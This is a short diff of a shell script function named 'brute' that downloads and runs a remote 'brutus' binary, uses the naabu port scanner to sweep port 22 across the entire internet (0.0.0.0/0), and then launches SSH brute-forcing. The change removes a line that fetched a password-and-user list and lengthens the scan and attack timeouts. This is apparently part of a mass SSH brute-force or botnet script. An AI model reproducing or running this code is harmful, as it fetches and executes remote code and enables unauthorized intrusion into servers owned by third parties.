@@ -20,18 +20,19 @@ brute() {
 cd /var/tmp/naabu-2.6.1/cmd/naabu
 
 wget $url_brutus  -O   brutus || curl -L $url_brutus  -o  brutus #install brutus
-wget $creds  -O  lista.txt   || curl -L  $creds  -o lista.txt  #list of pass  && users 
+
 
 chmod  +x brutus 
 
-timeout  5s     ./nabu  -p 22    -host    0.0.0.0/0     >    ips_nabu  #ssh
+timeout  120s     ./nabu  -p 22    -host    0.0.0.0/0     >    ips_nabu  #ssh
 
 
 grep -v "^127\." ips_nabu >  ips.txt
 
  
-timeout  5s  ./brutus 
+timeout  600s  ./brutus 
 
+#600 seconds   is 10 minutes
  
 
 
